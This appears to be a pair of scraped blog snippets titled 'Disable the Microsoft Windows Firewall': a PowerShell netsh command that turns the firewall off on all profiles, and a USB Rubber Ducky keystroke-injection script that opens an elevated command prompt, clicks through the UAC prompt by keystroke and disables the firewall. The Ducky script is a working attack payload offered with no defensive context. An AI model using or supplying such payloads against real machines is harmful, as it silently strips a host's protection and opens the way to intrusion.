# Disable the Microsoft Windows Firewall
## Network 
### URL: https://www.jesusninoc.com/2016/05/15/disable-the-microsoft-windows-firewall/
```PowerShell
netsh advfirewall set allprofiles state off

```
# Disable the Microsoft Windows Firewall
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2014/12/29/disable-microsoft-windows-firewall/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
STRING netsh firewall set opmode disable
ENTER

```
